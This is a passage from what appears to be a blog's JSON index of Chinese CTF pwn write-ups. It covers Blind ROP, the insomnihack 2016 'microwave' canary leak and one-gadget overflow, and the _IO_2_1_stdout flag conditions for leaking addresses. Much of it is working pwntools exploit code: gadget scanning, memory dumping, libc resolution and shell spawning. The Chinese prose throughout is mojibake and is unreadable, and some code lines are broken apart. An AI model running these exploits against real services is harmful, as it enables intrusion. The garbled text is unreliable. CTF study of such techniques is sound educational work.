1\n```\n\n4.å¾—åˆ°stop_addrä¹‹åï¼Œå°±å¯ä»¥ç»§ç»­æ¢ç´¢å…¶å®ƒçš„rop_gadgetï¼Œè¿™é‡Œå¯»æ‰¾ä¸‡èƒ½gadgetçš„å…­ä¸ªpopçš„åœ°æ–¹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\ndef get_gadgets_addr(buf_size, stop_addr):\n    addr = stop_addr\n    while True:\n        sleep(0.1)\n        addr += 1\n        payload = \"A\"*buf_size\n        payload += p64(addr)\n        payload += p64(1) + p64(2) + p64(3) + p64(4) + p64(5) +\n        p64(6)\n        payload += p64(stop_addr)\n        try:\n            p = remote('127.0.0.1', 10001)\n            p.recvline()\n            p.sendline(payload)\n            p.recvline()\n            p.close()\n            log.info(\"find address: 0x%x\" % addr)\n            try: # check\n                payload = \"A\"*buf_size\n                payload += p64(addr)\n                payload += p64(1) + p64(2) + p64(3) + p64(4) + p\n                64(5) + p64(6)\n                #Six pop without stop_addr\n                p = remote('127.0.0.1', 10001)\n                p.recvline()\n                p.sendline(payload)\n                p.recvline()\n                p.close()\n                log.info(\"bad address: 0x%x\" % addr)\n                #Not crash,Bad addr.\n            except:#Crash,success addr\n                p.close()\n                log.info(\"gadget address: 0x%x\" % addr)\n                return addr\n        except EOFError as e:\n            p.close()\n            log.info(\"bad: 0x%x\" % addr)\n        except:\n            log.info(\"Can't connect\")\n            addr -= 1\n```\n\næ‰¾åˆ°ä¹‹åï¼Œéœ€è¦å†æ¬¡æ£€æŸ¥ä¸€ä¸‹ï¼Œç”¨æ¥ç¡®å®šæ˜¯ä¸æ˜¯ä¸‡èƒ½gadgetï¼Œå› ä¸ºå¦‚æœæœ‰ç¨‹åºå…­ä¸ªpopä¹‹åä¸retnï¼Œé‚£å°±ä¸æ˜¯ä¸‡èƒ½gadgetã€‚å› ä¸ºéœ€è¦dumpäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ‰€ä»¥éœ€è¦ä¸‡èƒ½gadgetä¸­çš„Pop rdi;ret è¿™ä¸ªgadgetæ¥dumpæ–‡ä»¶ã€‚\n\n5.å¯»æ‰¾putså‡½æ•°çš„pltè¡¨ï¼Œæ–¹ä¾¿ä¹‹åè°ƒç”¨putså‡½æ•°å’Œpop rdi;retè¿™ä¸ªgadgetæ¥dumpäºŒè¿›åˆ¶æ–‡ä»¶ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\ndef get_puts_addr(buf_size, rdi_ret, stop_gadget):\n    addr = 0x400000\n    while 1:\n        print hex(addr)\n        sh = remote('127.0.0.1', 10001)\n        sh.recvuntil('password?\\n')\n        payload = 'A' * buf_size + p64(rdi_ret) + p64(0x400000) + p64(addr) + p64(stop_gadget)\n        #call put to print the head of ELF.\n        sh.sendline(payload)\n        try:\n            content = sh.recv()\n            if content.startswith('\\x7fELF'):\n                print(\"find puts@plt addr: 0x%x\"%addr)\n                return addr\n            sh.close()\n            addr += 1\n        except EOFError as e:\n            sh.close()\n            log.info(\"bad: 0x%x\" % addr)\n        except:\n            log.info(\"Can't connect\")\n            addr -= 1\n```\n\nè¿™é‡Œå®é™…ä¸Šæ‰¾å‡ºæ¥çš„åœ°å€å¹¶ä¸æ˜¯putså‡½æ•°çš„pltè¡¨åœ°å€ï¼Œè€Œæ˜¯åœ¨putsçš„pltè¡¨å‰é¢ä¸€ç‚¹çš„å†…å®¹ï¼Œä½†æ˜¯è¿™ä¸€å°æ®µå†…å®¹ä¸å½±å“æ ˆå’Œrdiå¯„å­˜å™¨ï¼Œæ‰€ä»¥æ²¡ä»€ä¹ˆå½±å“ã€‚\n\n6.åˆ©ç”¨putså‡½æ•°å’Œpop rdi;retæ¥dumpäºŒè¿›åˆ¶æ–‡ä»¶ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\ndef dump_memory(buf_size, stop_addr, gadgets_addr, puts_plt, start_addr, end_addr):\n    pop_rdi = gadgets_addr + 9 # pop rdi; ret\n    result = \"\"\n    while start_addr < end_addr:\n        #print result.encode('hex')\n        sleep(0.1)\n        payload = \"A\"*buf_size\n        payload += p64(pop_rdi)\n        payload += p64(start_addr)\n        payload += p64(puts_plt)\n        payload += p64(stop_addr)\n        try:\n            sh = remote('127.0.0.1', 10001)\n            sh.recvline()\n            sh.sendline(payload)\n            data = sh.recv(timeout=0.1) \n            #timeout makes sure to recive all bytes\n            if data == \"\\n\":#data = \\x00\n                data = \"\\x00\"\n            elif data[-1] == \"\\n\":\n            #data = xxxxx\\n\\x00,data = \\n\\x00,data = xxxxx\\x00\n                data = data[:-1]\n            log.info(\"leaking: 0x%x --> %s\" % (start_addr,(data or '').encode('hex')))\n            result += data\n            start_addr += len(data)\n            sh.close()\n        except:\n            log.info(\"Can't connect\")\n    return result\n```\n\nç”±äºputs å‡½æ•°é€šè¿‡ \\x00 è¿›è¡Œæˆªæ–­ï¼Œä¸ä¼šè¾“å‡º\\x00ï¼Œå¹¶ä¸”ä¼šåœ¨æ¯ä¸€æ¬¡è¾“å‡ºæœ«å°¾åŠ ä¸Šæ¢è¡Œç¬¦\\x0a ï¼Œæ‰€ä»¥æœ‰ä¸€äº›ç‰¹æ®Šæƒ…å†µéœ€è¦åšä¸€äº›å¤„ç†ï¼Œæ¯”å¦‚å•ç‹¬çš„ \\x00 ã€ \\x0a ç­‰ã€‚é¦–å…ˆå½“ç„¶æ˜¯å…ˆå»æ‰æœ«å°¾ puts è‡ªåŠ¨åŠ ä¸Šçš„ \\n ï¼Œç„¶åå¦‚æœ recv åˆ°ä¸€ä¸ª \\n ï¼Œè¯´æ˜å†…å­˜ä¸­æ˜¯ \\x00 ï¼Œå¦‚æœ recv åˆ°ä¸€ä¸ª \\n\\n ï¼Œè¯´æ˜å†…å­˜ä¸­æ˜¯\\x0a ã€‚ p.recv(timeout=0.1) æ˜¯ç”±äºå‡½æ•°æœ¬èº«çš„è®¾å®šï¼Œå¦‚æœæœ‰ \\n\\n ï¼Œå®ƒå¾ˆå¯èƒ½åœ¨æ”¶åˆ°ç¬¬ä¸€ä¸ª \\n æ—¶å°±è¿”å›äº†ï¼ŒåŠ ä¸Šå‚æ•°å¯ä»¥è®©å®ƒå…¨éƒ¨æ¥æ”¶å®Œã€‚\n\n7.å¾—åˆ°äºŒè¿›åˆ¶æ–‡ä»¶åå°±æ˜¯å¸¸è§„æ“ä½œäº†ï¼Œåˆ©ç”¨Dynelfæˆ–è€…LibcSearcherå’Œputså‡½æ•°æ‰¾åˆ°systemå‡½æ•°å’Œbinshå®é™…ä½ç½®ï¼Œä¹‹åé€šè¿‡pop rdi;retæ¥ä¸ºsystemå‡½æ•°èµ‹å‚æ•°ä»è€Œgetshellã€‚\n\n```\n#æ³¨é‡Šå¤´\n\nsh = remote('127.0.0.1', 10001)\nsh.recvuntil('password?\\n')\npayload = 'a' * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(\nstop_gadget)\nsh.sendline(payload)\ndata = sh.recvuntil('\\nWelCome', drop=True)\nputs_addr = u64(data.ljust(8, '\\x00'))\nlibc = LibcSearcher('puts', puts_addr)\nlibc_base = puts_addr - libc.dump('puts')\nsystem_addr = libc_base + libc.dump('system')\nbinsh_addr = libc_base + libc.dump('str_bin_sh')\npayload = 'a' * length + p64(rdi_ret) + p64(binsh_addr) + p64(\nsystem_addr) + p64(stop_gadget)\nsh.sendline(payload)\nsh.interactive()\n```\n\nè¿™é‡Œçš„libcSearcheræœ‰æ—¶å€™ä¸å¤ªå¥½ç”¨ï¼ŒæŸ¥åˆ°çš„libcä¸ç¬¦åˆï¼Œæˆ–è€…æ˜¯ä¸å¯¹ã€‚è¿˜æ˜¯DynElfå¥½ç”¨ä¸€äº›ï¼Œæ¯”è¾ƒå‡†ç¡®ï¼Œå¹¶ä¸”ç”±äºæ˜¯putså‡½æ•°æ‰“å°ï¼Œæ‰€ä»¥å¯èƒ½éœ€è¦å•ä¸ªå­—ç¬¦æ¥åˆ¤æ–­ã€‚ä½†å®é™…ä¸Š64ä½æ¡ä»¶ä¸‹çš„gotè¡¨ä¸­çš„åœ°å€ä¸€å®šæ˜¯0x00007fxxxxxxxxxxï¼Œæ‰€ä»¥å¦‚æœæ˜¯å¤§ç«¯æƒ…å†µï¼Œé‚£ä¹ˆputså‡½æ•°ä¸€å®šä¼šæˆªæ–­ï¼Œæ¥æ”¶åˆ°çš„åªä¼šæ˜¯xxxxxxxxxx7få’Œ0aæ‰€ä»¥å…¶å®åªè¦åˆ¤æ–­åˆ°æ¢è¡Œç¬¦çš„æ—¶å€™å°±å¯ä»¥ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\ndef leak(address):\n    data = \"\"\n    c=\"\"\n    up = \"\"\n    payload = 'a' * length + p64(rdi_ret) + p64(address) + p64(puts_plt) + p64(stop_gadget)\n    sh.recvuntil('password?\\n')\n    sh.send(payload)\n    while True:\n        c = p.recv(1)\n        if up == '\\n' and c == \"W\":  \n            data = data[:-1]                     \n            data += \"\\x00\"\n            break\n        else:\n            data += c\n        up = c\n    data=data[:7]#å®é™…æœ‰æ•ˆåœ°å€åªæœ‰6ä¸ªå­—ç¬¦\n    log.info(\"%#x => %s\" % (address, (data or '').encode('hex')))\n    return data\n\n\ndynelf = DynELF(leak, elf=ELF(\"./brop\"))\nsystem_addr = dynelf.lookup(\"__libc_system\", \"libc\")\n```\n\nä½†æ˜¯DynElfå¥½åƒä¸èƒ½æ‰¾binshå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥å¦‚æœç”¨è¿™ç§æ–¹æ³•é‚£å°±è¿˜éœ€è¦æ³„éœ²readçš„çœŸå®åœ°å€ï¼Œæ‰¾ä¸ªèƒ½å†™çš„åœ°æ–¹å°†binshå†™è¿›å»å†è°ƒç”¨ï¼Œæ¯”è¾ƒéº»çƒ¦ã€‚æ‰€ä»¥èƒ½ç”¨libcSearcherå¯ä»¥å…ˆç”¨æ¥è¯•è¯•ï¼Œå‡½æ•°ï¼Œbinshå­—ç¬¦ä¸²éƒ½èƒ½æ‰¾ï¼Œæ¯”è¾ƒæ–¹ä¾¿ä¸€ç‚¹ã€‚\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://wiki.x10sec.org/pwn/linux/stackoverflow/medium-rop-zh/#brop\n\nctf-all-in-one\n\n \n\n \n","tags":["Blind"],"categories":["PWN","BlindROP"]},{"title":"insomnihack CTF 2016-microwave","url":"/2021/08/19/insomnihack CTF 2016-microwave/","content":"\n1.å¸¸è§„checksecï¼Œç¨‹åºå…¨éƒ¨å¼€å¯ä¿æŠ¤ï¼Œå¹¶ä¸”æœ‰canaryä¿æŠ¤ï¼Œä»IDAä¸­æ±‡ç¼–ä»£ç å’Œä¼ªä»£ç ä¹Ÿå¯ä»¥çœ‹åˆ°ï¼š\n\n(1)æ±‡ç¼–ä»£ç ï¼š\n\nâ‘ ç”Ÿæˆcanaryçš„ä»£ç :ä¸€èˆ¬åœ¨å‡½æ•°åˆå§‹åŒ–çš„æ—¶å€™å°±å¯ä»¥çœ‹åˆ°\n\n```\n#æ³¨é‡Šå¤´\n\nmov rax,fs:28h\nmov [rsp+28h+var_20], rax\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191523843.png)\n\nâ‘¡æ ¡éªŒ:\n\n```\n#æ³¨é‡Šå¤´\n\nmov rax, [rsp+28h+var_20]\nxor rax, fs:28h\njnz short func\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191523812.png)\n\n(2)ä¼ªä»£ç ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nv_canary = __readfsqword(0x28u);\nreturn __readfsqword(0x28u) ^ v_canary;\n```\n\næœ‰å¾ˆå¤šç§å½¢å¼ï¼Œå¦‚ä¸‹ä¹Ÿæ˜¯ä¸€ç§ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191523399.png)\n\n2.ä¹‹åæŸ¥æ‰¾æ¼æ´ï¼Œæ‰¾åˆ°ä¸¤ä¸ªæ¼æ´ï¼š\n\n(1)åŠŸèƒ½1çš„sub_F00å‡½æ•°ä¸­çš„printfå­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n__printf_chk(1LL, a1);\n```\n\nè¿™é‡Œçš„1LLä¸çŸ¥é“æ˜¯ä¸ªä»€ä¹ˆæ„æ€ï¼Œä½†æ˜¯å®é™…æ•ˆæœä»ç„¶ç›¸å½“äºæ˜¯printf(a1)ï¼Œè°ƒè¯•ä¸­å¯ä»¥çŸ¥é“ã€‚\n\n(2)åŠŸèƒ½2çš„sub_1000å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n__int64 v1; // [rsp+0h] [rbp-418h]\n------------------------------------------------------\nread(0, &v1, 0x800uLL);\n```\n\n3.ç°åœ¨æ˜¯ä¿æŠ¤å…¨å¼€ï¼Œæ ˆæº¢å‡ºæ¼æ´å› ä¸ºcanaryçš„å…³ç³»æ²¡åŠæ³•åˆ©ç”¨ï¼Œå”¯ä¸€èƒ½åˆ©ç”¨çš„åªæœ‰ä¸€ä¸ªprintf()å‡½æ•°ï¼Œè€Œä¸”è¿˜æ²¡åŠæ³•åŠ«æŒgotè¡¨ï¼Œæ²¡åŠæ³•è¿›è¡Œå®Œå…¨æ ˆæ“æ§ã€‚æ‰€ä»¥è¿™é‡Œå°±æƒ³èƒ½ä¸èƒ½é€šè¿‡printfå‡½æ•°æ³„éœ²canaryä»è€Œä½¿å¾—æ ˆæº¢å‡ºè¿™ä¸ªæ¼æ´æ´¾ä¸Šç”¨åœºã€‚\n\n4.é¦–å…ˆè°ƒè¯•ï¼Œè§‚å¯Ÿcanaryåœ¨æ ˆä¸Šçš„åç§»ä½ç½®ï¼Œè°ƒè¯•æ–­ç‚¹ä¸‹åœ¨sub_F00å‡½æ•°çš„printfå‡½æ•°ä¸Šï¼Œå› ä¸ºè¿™ä¸ªsub_F00å‡½æ•°ä¸­ä¹Ÿæœ‰canaryçš„ä¿æŠ¤ï¼Œé‚£ä¹ˆè¯¥å‡½æ•°æ ˆä¸Šä¸€å®šå­˜åœ¨canaryçš„å€¼ã€‚è‡ªå·±è°ƒè¯•å¦‚ä¸‹å›¾ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191523613.png)\n\nIDAè°ƒè¯•ç•Œé¢ç‚¹å‡»å¯¹åº”ç”Ÿæˆcanaryçš„ä»£ç mov  [rsp+28h+var_20], raxä¸­çš„[rsp+28h+var_20]å°±å¯ä»¥çŸ¥é“canaryçš„ä½ç½®åº”è¯¥æ˜¯rsp+8hå¤„ï¼Œè¿™é‡Œä¹Ÿå¯ä»¥çœ‹å‡ºæ¥V6å°±æ˜¯canary\n\nå¦å¤–ç”±äºè¿™æ˜¯64ä½ç¨‹åºï¼Œå–å‚é¡ºåºæ˜¯rdi, rsi, rdx, rcx, r8, r9, æ ˆï¼Œç”±äºprintf()å‰ä¸¤ä¸ªå‚æ•°ä½rdi,rsiå¯¹åº”çš„æ˜¯fdå’Œ&bufï¼Œ\n\nè¿™é‡Œçš„bufå°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„usernameï¼Œå› ä¸ºusernameçš„è¾“å…¥ä¿å­˜åœ¨å †ä¸Šmainå‡½æ•°ä¸­æœ‰å£°æ˜ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nvoid *v4; // r12\n----------------------------------------------------------------\nv4 = malloc(0x3EuLL);\n-------------------------------------------------------------------\nfwrite(\" username: \", 1uLL, 0x15uLL, stdout);\nfflush(0LL);\nfgets((char *)v4, 40, stdin);\n--------------------------------------------------------------------\nfwrite(\" password: \", 1uLL, 0x15uLL, stdout);\nfflush(0LL);\nv3 = 20LL;\nfgets((char *)v4 + 40, 20, stdin);\n------------------------------------------------------------------------\nsub_F00((__int64)v4);\n--------------------------------------------------------------------\nunsigned __int64 __fastcall sub_F00(__int64 a1)\n-------------------------------------------------------------------\n__printf_chk(1LL, a1);\n```\n\nä¸‹å›¾æ˜¯æ²¡æœ‰æ‰“å°ä¹‹å‰çš„å†…å®¹ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191523728.png)\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°rsiçš„å€¼æ˜¯5å¼€å¤´çš„ï¼Œè¿™å…¶å®å°±æ˜¯ä¸€ä¸ªå †å†…å­˜åœ°å€ï¼Œè°ƒè¯•è¿‡ç¨‹ä¸­è¾“å…¥è·³è½¬å°±å¯ä»¥çœ‹åˆ°è¯¥åœ°å€å¯¹åº”çš„å†…å®¹å°±æ˜¯æˆ‘ä»¬çš„è¾“å…¥usernameçš„å€¼ã€‚é‚£ä¹ˆè¾“å…¥usernameæ—¶è¾“å…¥å¤šä¸ª%pï¼Œè§¦å‘æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œæ‰“å°å¯„å­˜å™¨å’Œæ ˆä¸Šçš„å†…å®¹ï¼Œæ³„éœ²å‡ºlibcåœ°å€å’Œcanaryã€‚printf()ä¾æ¬¡æ ¹æ®%pæ‰“å°çš„å‚æ•°é¡ºåºæ˜¯rdx,rcx,r8,r9,æ ˆã€‚æ‰€ä»¥r9ä¹‹åç¬¬ä¸€ä¸ªæ‰“å°å‡ºæ¥çš„æ•°æ®æ˜¯rsp-8hï¼Œä¹Ÿå°±æ˜¯canaryçš„å€¼ï¼Œè¿™æ ·å°±å¯ä»¥å¾—åˆ°æ³„éœ²çš„canaryçš„å€¼ï¼Œä»è€Œæ§åˆ¶æ ˆæº¢å‡ºã€‚åŒæ—¶æˆ‘ä»¬å¯ä»¥å‘ç°æ‰“å°å‡ºæ¥çš„æ•°æ®ä¸­åŒ…å«libcä¸­çš„å‡½æ•°ï¼Œè¿™æ ·åŒæ—¶ä¹Ÿæ³„éœ²å‡ºæ¥äº†libcåŠ è½½åçš„åœ°å€ï¼Œä¹‹åé€šè¿‡åç§»è®¡ç®—å‡ºåŸºåœ°å€ã€‚\n\n5.ä¹‹åè¿›è¡Œæ ˆæº¢å‡ºæ“æ§ï¼Œä½†æ˜¯è¿™é‡Œå¦‚æœè¿ä¸ä¸Šè´¦æˆ·ä¼šæ²¡åŠæ³•ä½¿ç”¨sub_1000å‡½æ•°ï¼Œç”¨IDAæŸ¥çœ‹å¯ä»¥çœ‹åˆ°åœ¨sub_f00å‡½æ•°ä¸­å¯¹å¯†ç è¿›è¡Œæ£€æŸ¥ï¼Œå¯ç›´æ¥æŸ¥çœ‹åˆ°å¯†ç ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191522910.png)\n\nè¿™ä¸ªoff_204010å°±æ˜¯å¯†ç ï¼Œç‚¹è¿›å»å°±å¯ä»¥çœ‹åˆ°ã€‚\n\nç”±ä¹‹å‰æ­¥éª¤å¯ä»¥å¾—åˆ°canaryå’ŒlibcåŸºåœ°å€ã€‚æŸ¥è¯¢ä¹‹åå¯ä»¥å‘ç°ç”±äºretnå‰ä¼šæ£€æŸ¥canaryï¼Œå¯¹åº”æ±‡ç¼–ä»£ç æ˜¯ï¼š\n\nxor rax, fs:28h\n\né‚£ä¹ˆå¦‚æœcanaryè¾“å…¥æˆåŠŸï¼Œxorä¹‹åä¼šä½¿å¾—raxä¸€å®šä¸º0ï¼Œæ»¡è¶³è¯¥libcåº“çš„Onegadgetæ¡ä»¶ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥ç›´æ¥ä½¿ç”¨Onegadgetï¼š\n\n```\n#æ³¨é‡Šå¤´\n\npayload = \"A\"*1032 #padding\npayload += p64(canary) #æ­£ç¡®çš„canary\npayload += \"B\"*8 #padding\npayload += p64(one_gadget_addr) #one gadget RCE\nio.sendline('2') #ä½¿ç”¨æœ‰æ ˆæº¢å‡ºçš„åŠŸèƒ½2\nio.recvuntil('#> ')\nio.sendline(payload)\n```\n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["canary"],"categories":["PWN","canaryç»•è¿‡0x9"]},{"title":"åˆ©ç”¨IO_FILEæ³„éœ²åœ°å€","url":"/2021/08/19/åˆ©ç”¨IO_FILEæ³„éœ²åœ°å€/","content":"\nIO_FILEçš„å…·ä½“ç»“æ„å’ŒåŠŸèƒ½åœ¨FSOPä¸­å†™è¿‡ï¼Œè¿™é‡Œä¸»è¦å…³æ³¨ä¸‹å…¶ä¸­çš„æ‰“å°å‡½æ•°_IO_2_1_stdoutçš„ç›¸å…³åˆ©ç”¨ï¼Œé€šå¸¸ç”¨æ¥åœ¨å †åˆ©ç”¨æ—¶ï¼Œç”±äºæ²¡æœ‰showä¹‹ç±»çš„æ‰“å°å †å—å†…å®¹çš„é€‰é¡¹ï¼Œå¯¼è‡´æ— æ³•æ³„éœ²libcåœ°å€çš„æƒ…å†µã€‚\n\nä¸€ã€_flagsï¼š\n\nè¿™é‡Œçš„_flagsåœ¨_IO_2_1_stdoutç»“æ„ä½“ä¸­ï¼Œä¸€æ—¦æˆ‘ä»¬æƒ³è¦é€šè¿‡_IO_2_1_stdoutæ¥æ‰“å°æŒ‡å®šå†…å­˜åœ°å€çš„å†…å®¹ï¼Œå°±éœ€è¦å¯¹_flagsçš„å€¼è¿›è¡Œè®¾ç½®ï¼Œç»•è¿‡ä¸€äº›æ£€æŸ¥ï¼Œæ‰èƒ½æœ€ç»ˆè¿›å…¥_IO_SYSWRITEå‡½æ•°æ‰“å°ã€‚\n\n1._IO_new_file_overflowå‡½æ•°ä¸­çš„æ£€æŸ¥ï¼š\n\n(1)ä¸èƒ½è¿›å…¥ï¼Œåˆ¤æ–­è¯­å¥éœ€è¦ä¸ºå‡ï¼Œå¦åˆ™ç›´æ¥è¿”å›EOFäº†ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\nif (f->_flags & _IO_NO_WRITES)   /* SET ERROR */\n{\n    f->_flags |= _IO_ERR_SEEN;\n    __set_errno (EBADF);\n    return EOF;\n}\n```\n\néœ€è¦æ»¡è¶³æ¡ä»¶ï¼šf->_flags & _IO_NO_WRITES == false\n\n(2)ä¸èƒ½è¿›å…¥ï¼Œåˆ¤æ–­è¯­å¥éœ€è¦ä¸ºå‡\n\n```\n#æ³¨é‡Šå¤´\n\nif ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)\n```\n\nå› ä¸ºè¿™é‡Œä¸€æ—¦è¿›å…¥ï¼Œå°±ä¼šæœ‰ä¸€ä¸ªåˆå§‹åŒ–æŒ‡é’ˆçš„æ“ä½œï¼Œå¯¼è‡´æˆ‘ä»¬çš„_IO_write_baseè¢«è¦†ç›–ï¼Œä»è€Œæ— æ³•è¾“å‡ºæƒ³è¦çš„åœ°å€çš„å†…å®¹ã€‚\n\néœ€è¦æ»¡è¶³æ¡ä»¶ï¼š((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL) == false\n\nä¹‹åå°±è·³åˆ°å¦‚ä¸‹è¯­å¥ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nif (ch == EOF)\n    return _IO_do_write (f, f->_IO_write_base,f->_IO_write_ptr - f->_IO_write_base);\n```\n\nè¿›å…¥_IO_do_writeå‡½æ•°ã€‚\n\n2._IO_do_writeå‡½æ•°ä¸­çš„æ£€æŸ¥ï¼š\n\nâ–²ç”±äºå¦‚ä¸‹å®šä¹‰ï¼šlibc_hidden_ver (_IO_new_do_write, _IO_do_write)ï¼Œè¯¥å‡½æ•°æˆäº†_IO_new_do_writeå‡½æ•°ï¼Œå®šä¹‰å¦‚ä¸‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n_IO_new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)\n{\n    return (to_do == 0\n        || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;\n}\n```\n\nè¿™ä¸ªå‡½æ•°ä¸­æ²¡ä»€ä¹ˆæ“ä½œï¼Œç›´æ¥è¿›å…¥åˆ°new_do_writeå‡½æ•°.\n\n3.new_do_writeå‡½æ•°ä¸­çš„æ£€æŸ¥ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nif (fp->_flags & _IO_IS_APPENDING)\nelse if (fp->_IO_read_end != fp->_IO_write_base)\n```\n\nè¿™é‡Œå…¶å®ä¸å¤ªæ˜ç™½ï¼Œå¾ˆå¤šåœ°æ–¹è¯´è¦æ»¡è¶³å…¶ä¸­ä¸€ä¸ªæ‰èƒ½è¿›å…¥åˆ°å®é™…è°ƒç”¨æ‰“å°çš„ç³»ç»Ÿå‡½æ•°ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\ncount = _IO_SYSWRITE (fp, data, to_do);\n```\n\nä½†æ˜¯æˆ‘è®¤ä¸ºifå’Œelse iféƒ½ç»•è¿‡åº”è¯¥ä¹Ÿå¯ä»¥è¿è¡Œåˆ°countçš„æ‰§è¡Œè¯­å¥ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯å› ä¸ºéœ€è¦è®¾ç½®fp->_offsetæ‰èƒ½æ‰“å°ï¼Œé‚£å¦‚æœæ˜¯çš„è¯ï¼Œæ§åˆ¶_IO_2_1_stdoutçš„ç»“æ„ä½“ä¸ä¹Ÿèƒ½è®¾ç½®fp->_offsetçš„å€¼å—ã€‚\n\n(1)é’ˆå¯¹if (fp->_flags & _IO_IS_APPENDING)ï¼šè¿™ä¸ªå¯ä»¥è¿›å…¥ï¼Œå½±å“ä¸å¤§\n\n```\n#æ³¨é‡Šå¤´\n\nif (fp->_flags & _IO_IS_APPENDING)\n     fp->_offset = _IO_pos_BAD;\n```\n\n(2)é’ˆå¯¹else if (fp->_IO_read_end != fp->_IO_write_base)ï¼Œè¿™ä¸ªä¸å¤ªèƒ½å¤Ÿè¿›å…¥ï¼Œå› ä¸ºè¯¥è¯­å¥å¦‚ä¸‹ï¼š\n\n```\nelse if (fp->_IO_read_end != fp->_IO_write_base)\n{\n    _IO_off64_t new_pos = _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);\n    if (new_pos == _IO_pos_BAD)\n        return 0;\n    fp->_offset = new_pos;\n}\n```\n\nå› ä¸º_IO_SYSSEEKå¯èƒ½ä¼šæ‰§è¡Œé”™è¯¯ï¼Œå´©æºƒï¼Œæ— æ³•åˆ°è¾¾countçš„æ‰§è¡Œè¯­å¥ã€‚è€Œä¸”fp->_IO_read_end != fp->_IO_write_baseåˆ¤æ–­è¯­å¥æ»¡è¶³çš„æ¦‚ç‡ç›¸å½“å¤§ï¼Œè¿™å°±å¯¼è‡´å¦‚æœç¬¬ä¸€ä¸ªifä¸è¿›å…¥ï¼Œé‚£ä¹ˆç¬¬äºŒä¸ªelse ifå°±æœ‰å¾ˆå¤§æ¦‚ç‡è¿›å…¥ï¼Œç„¶åå°±å¯èƒ½ä¼šå´©æºƒã€‚æ‰€ä»¥åœ¨åªèƒ½è®¾ç½®flagså€¼çš„æƒ…å†µä¸‹è¿˜æ˜¯è¿›å…¥ç¬¬ä¸€ä¸ªIfè¯­å¥æ˜¯æœ€å¥½çš„é€‰æ‹©ã€‚\n\næ‰€ä»¥éœ€è¦æ»¡è¶³æ¡ä»¶ï¼šfp->_flags & _IO_IS_APPENDING == true\n\nâ–²åé¢æ‰æƒ³æ˜ç™½æ˜¯å› ä¸ºå¦‚æœåªè®¾ç½®flagsçš„è¯ï¼Œè€Œ_IO_read_endå’Œ_IO_write_baseçš„å€¼æ— æ³•æ§åˆ¶çš„æƒ…å†µä¸‹ï¼Œæœ€å¥½ä½¿ç¨‹åºæµè¿›å»if (fp->_flags & _IO_IS_APPENDING)è¯­å¥ï¼Œè€Œä¸è¦ä½¿ç¨‹åºæµè¿›å…¥else ifè¯­å¥ã€‚\n\n4.ç»¼ä¸Šä¸‰ä¸ªæ¡ä»¶ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nf->_flags & _IO_NO_WRITES == FALSE\n((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL) == FALSE\nfp->_flags & _IO_IS_APPENDING == TRUE\n```\n\nå†åŠ ä¸Šflagså€¼çš„ç›¸å…³å®å®šä¹‰ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n//é«˜16ä½\n#define _IO_MAGIC 0xFBAD0000 /* Magic number */\n#define _OLD_STDIO_MAGIC 0xFABC0000 /* Emulate old stdio. */\n#define _IO_MAGIC_MASK 0xFFFF0000\n\n//ä½16ä½\n-------------------------------------------------------------------\n#define _IO_USER_BUF 1 /* User owns buffer; don't delete it on close. */\n#define _IO_UNBUFFERED 2\n#define _IO_NO_READS 4 /* Reading not allowed */\n#define _IO_NO_WRITES 8 /* Writing not allowd */\n#define _IO_EOF_SEEN 0x10\n#define _IO_ERR_SEEN 0x20\n#define _IO_DELETE_DONT_CLOSE 0x40 /* Don't call close(_fileno) on cleanup. */\n#define _IO_LINKED 0x80 /* Set if linked (using _chain) to streambuf::_list_all.*/\n#define _IO_IN_BACKUP 0x100\n#define _IO_LINE_BUF 0x200\n#define _IO_TIED_PUT_GET 0x400 /* Set if put and get pointer logicly tied. */\n#define _IO_CURRENTLY_PUTTING 0x800\n#define _IO_IS_APPENDING 0x1000\n#define _IO_IS_FILEBUF 0x2000\n#define _IO_BAD_SEEN 0x4000\n#define _IO_USER_LOCK 